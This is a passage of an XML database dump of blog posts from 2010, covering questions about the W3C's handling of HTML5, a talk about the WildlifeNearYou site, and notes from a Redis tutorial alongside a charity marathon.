&lt;p&gt;&lt;a href=&quot;http://www.flickr.com/photos/cindyli/3072532829/in/set-72157610369683426/&quot;&gt;&lt;img src=&quot;http://simonwillison.net/static/2010/devfort-group.jpg&quot; width=&quot;450&quot; height=&quot;300&quot; alt=&quot;Group photo at the Fort&quot; title=&quot;Group photo at the fort, by Cindy Li&quot; /&gt;&lt;/a&gt;&lt;/p&gt;</field>
		<field name="created">2010-01-12 22:53:20</field>
		<field name="comments_open">1</field>
	</row>

	<row>
		<field name="id">1597</field>
		<field name="title">Some questions about the &quot;blocking&quot; of HTML5</field>
		<field name="slug">html5</field>
		<field name="body">&lt;ol&gt;
&lt;li&gt;When people say that the publication of HTML5 &quot;blocked&quot; by Larry Masinter's &quot;formal objection&quot;, what exactly do they mean?
&lt;/li&gt;
&lt;li&gt;Why does the private w3c-archive mailing list exist? Why can't anyone reveal what happens on there? What are the consequences for doing so? Who gets to be on that list in the first place?
&lt;/li&gt;
&lt;li&gt;Can anyone raise a &quot;formal objection&quot;?&lt;/li&gt;
&lt;li&gt;Is anyone calling for the HTML Working Group to be &quot;rechartered&quot;? If so, what does that involve?&lt;/li&gt;
&lt;li&gt;If there are concerns about the inclusion of Canvas 2D in the specification, why were these not resolved earlier?&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Some &lt;a href=&quot;http://simonwillison.net/tags/html5%2Badobe/&quot;&gt;background reading&lt;/a&gt;. I was planning to fill in answers as they arrive, but I screwed up the moderation of the comments and got flooded with detailed responses - I strongly recommend &lt;a href=&quot;http://simonwillison.net/2010/Feb/16/html5/#comments&quot;&gt;reading the comments&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2010-02-16 09:11:21</field>
		<field name="comments_open">1</field>
	</row>

	<row>
		<field name="id">1598</field>
		<field name="title">WildlifeNearYou talk at £5 app, and being Wired (not Tired)</field>
		<field name="slug">wired</field>
		<field name="body">&lt;p&gt;Two quick updates about &lt;a href=&quot;http://www.wildlifenearyou.com/&quot;&gt;WildlifeNearYou&lt;/a&gt;. First up, I gave a talk about the site at &lt;a href=&quot;http://fivepoundapp.com/&quot;&gt;£5 app&lt;/a&gt;, my favourite Brighton evening event which celebrates side projects and the joy of Making Stuff. I talked about the site's &lt;a href=&quot;http://simonwillison.net/2010/Jan/12/wildlifenearyou/&quot;&gt;genesis on a fort&lt;/a&gt;, &lt;a href=&quot;http://www.wildlifenearyou.com/best/&quot;&gt;crowdsourcing photo ratings&lt;/a&gt;, how we use &lt;a href=&quot;http://www.freebase.com/&quot;&gt;Freebase&lt;/a&gt; and &lt;a href=&quot;http://dbpedia.org/&quot;&gt;DBpedia&lt;/a&gt; and how integrating with Flickr's machine tags gave us &lt;a href=&quot;http://code.flickr.com/blog/2010/02/10/5-questions-for-simon-willison/&quot;&gt;a powerful location API for free&lt;/a&gt;. Here's the video of the talk, courtesy of &lt;a href=&quot;http://ianozsvald.com/2010/03/31/22nd-5-app-write-up-for-wildlife-plaques-robots-go-and-golf-gadgets/&quot; title=&quot;22nd £5 App Write-up for WildLife, Plaques, Robots, Go and Golf Gadgets&quot;&gt;Ian Oszvald&lt;/a&gt;:&lt;/p&gt;

&lt;object width=&quot;450&quot; height=&quot;255&quot;&gt;&lt;param name=&quot;allowfullscreen&quot; value=&quot;true&quot; /&gt;&lt;param name=&quot;allowscriptaccess&quot; value=&quot;always&quot; /&gt;&lt;param name=&quot;movie&quot; value=&quot;http://vimeo.com/moogaloop.swf?clip_id=10578232&amp;amp;server=vimeo.com&amp;amp;show_title=1&amp;amp;show_byline=1&amp;amp;show_portrait=0&amp;amp;color=00ADEF&amp;amp;fullscreen=1&quot; /&gt;&lt;embed src=&quot;http://vimeo.com/moogaloop.swf?clip_id=10578232&amp;amp;server=vimeo.com&amp;amp;show_title=1&amp;amp;show_byline=1&amp;amp;show_portrait=0&amp;amp;color=00ADEF&amp;amp;fullscreen=1&quot; type=&quot;application/x-shockwave-flash&quot; allowfullscreen=&quot;true&quot; allowscriptaccess=&quot;always&quot; width=&quot;450&quot; height=&quot;255&quot;&gt;&lt;/embed&gt;&lt;/object&gt;&lt;p&gt;&lt;a href=&quot;http://vimeo.com/10578232&quot;&gt;£5 App #22 WildLifeNearYou by Simon Willison and Natalie Downe&lt;/a&gt; from &lt;a href=&quot;http://vimeo.com/user707645&quot;&gt;IanProCastsCoUk&lt;/a&gt; on &lt;a href=&quot;http://vimeo.com&quot;&gt;Vimeo&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Secondly, I'm excited to note that WildlifeNearYou spin-off &lt;a href=&quot;http://owlsnearyou.com/&quot;&gt;OwlsNearYou.com&lt;/a&gt; is featured in UK Wired magazine's Wired / Tired / Expired column... and we're Wired!&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://www.flickr.com/photos/simon/4511451405/&quot;&gt;&lt;img src=&quot;http://simonwillison.net/static/2010/wired-owls-small.jpg&quot; alt=&quot;Wired / Tired / Expired column from May 2010 Wired UK&quot; width=&quot;450&quot; height=&quot;176&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
</field>
		<field name="created">2010-04-11 20:42:11</field>
		<field name="comments_open">1</field>
	</row>

	<row>
		<field name="id">1599</field>
		<field name="title">Comprehensive notes from my three hour Redis tutorial</field>
		<field name="slug">redis</field>
		<field name="body">&lt;p&gt;Last week I presented two talks at the inaugural &lt;a href=&quot;http://nosqleu.com/&quot;&gt;NoSQL Europe&lt;/a&gt; conference in London. The first was presented with Matthew Wall and covered the ways in which we have been exploring &lt;a href=&quot;http://www.slideshare.net/matwall/nosql-presentation&quot;&gt;NoSQL at the Guardian&lt;/a&gt;. The second was a three hour workshop on Redis, my favourite piece of software to have the NoSQL label applied to it.&lt;/p&gt;

&lt;p&gt;I've &lt;a href=&quot;http://simonwillison.net/2009/Oct/22/redis/&quot;&gt;written about Redis&lt;/a&gt; here before, and it has since earned a place next to MySQL/PostgreSQL and memcached as part of my default web application stack. Redis makes write-heavy features such as real-time statistics feasible for small applications, while effortlessly scaling up to handle larger projects as well. If you haven't tried it out yet, you're sorely missing out.&lt;/p&gt;

&lt;p&gt;For the workshop, I tried to give an overview of each individual Redis feature along with detailed examples of real-world problems that the feature can help solve. I spent the past day annotating each slide with detailed notes, and I think the result makes a pretty good stand-alone tutorial. Here's the end result:&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://simonwillison.net/static/2010/redis-tutorial/&quot;&gt;Redis tutorial slides and notes&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;In unrelated news, Nat and I both completed the first ever &lt;a href=&quot;http://brightonmarathon.co.uk/&quot;&gt;Brighton Marathon&lt;/a&gt; last weekend, in my case &lt;a href=&quot;http://www.sportsystems.co.uk/ss/results.htm?entId=WILLI-DJVYM-SIMNV&quot;&gt;taking 4 hours, 55 minutes and 17 seconds&lt;/a&gt;. Sincere thanks to everyone who came out to support us - until the race I had never appreciated how important the support of the spectators is to keep going to the end. We &lt;a href=&quot;http://www.justgiving.com/natalie-simon-marathon-2010&quot;&gt;raised £757&lt;/a&gt; for the &lt;a href=&quot;http://www.heart.co.uk/have-a-heart/&quot;&gt;Have a Heart&lt;/a&gt; children's charity. Thanks in particular to &lt;a href=&quot;http://clearleft.com/&quot;&gt;Clearleft&lt;/a&gt; who kindly offered to match every donation.&lt;/p&gt;</field>
		<field name="created">2010-04-25 22:36:16</field>
		<field name="comments_open">1</field>
	</row>

	</table_data>

</database>
</mysqldump>
